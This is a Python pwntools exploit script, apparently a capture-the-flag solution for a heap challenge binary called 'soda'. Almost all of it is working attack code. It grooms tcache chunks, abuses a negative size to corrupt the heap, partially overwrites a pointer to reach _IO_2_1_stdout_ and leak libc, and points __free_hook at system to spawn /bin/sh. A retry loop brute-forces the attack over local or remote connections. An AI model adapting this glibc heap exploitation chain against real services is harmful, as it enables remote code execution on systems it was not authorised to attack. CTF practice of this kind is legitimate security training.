# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './soda'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size ,Content = 'a'):
    cmd(1)
    sla('size:' , size)
    sa('Content:' , Content)

def delete(idx):
    cmd(2)
    sla('idx:'  ,idx)

# one_gad = one_gadget(libc.path)

def attack():
    # dbg('malloc')
    add(0x18)

    for i in range(7):
        add(0xf8 - 0x10*i)
        delete(1)
    add(0x18)
    delete(0)

    add(0xf8)
    # dbg()
    add( -1 , flat(0,0,0,0x5b1))
    delete(0)
    add(0xf8)
    add(0x18 , p16(0x2720))
    add(0xe8)

    fake_io = flat(
        0xfbad1800 , 0,
        0,0
    )
    add(0xe8 , fake_io + '\x00')

    leak = l64()
    if(leak == 0):
        exit(0)
    lg('leak',leak)

    _IO_2_1_stdout_ = leak + 0x4340
    libc.address = _IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    add(0x58)
    add(0x68)
    add(0x18 , p64(__free_hook - 8))
    lg('__free_hook',__free_hook)
    lg('_IO_2_1_stdout_',_IO_2_1_stdout_)
    
    delete(0)
    delete(1)
    add(0xd8)
    add(0xd8 , flat('/bin/sh\x00' , system_addr))

    delete(1)
    # dbg()

    sl('echo shell')
    ru('shell')
    p.interactive()

exhaust(attack)


'''
@File    :   soda.py
@Time    :   2021/10/20 11:35:51
@Author  :   Niyah 
'''